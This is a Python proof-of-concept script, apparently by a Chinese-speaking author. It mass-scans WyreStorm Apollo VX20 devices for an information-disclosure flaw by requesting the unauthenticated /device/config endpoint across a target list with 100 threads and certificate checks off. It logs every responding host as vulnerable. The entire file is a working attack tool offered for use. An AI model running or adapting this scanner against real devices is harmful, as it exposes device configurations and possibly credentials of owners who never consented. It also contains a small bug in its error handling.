import argparse,sys,re,requests
from multiprocessing.dummy import Pool
#忽略警告
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                         info:WyreStorm Apollo VX20 信息泄露漏洞 
                                         version:1.0 author:YeahSir        
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description='WyreStorm Apollo VX20 信息泄露漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = '/device/config'
    url = target+payload_url
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Connection': 'close',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Accept-Encoding': 'gzip'

    }

    res = ""
    try:
        res = requests.get(url,headers=header,verify=False,timeout=5)
        #判断是否存在信息泄露
        if res.status_code == 200:
            print(f"[+]该url{target}存在漏洞")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-]该url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]该url{target}存在问题"+e)



if __name__ ==  '__main__':
    main()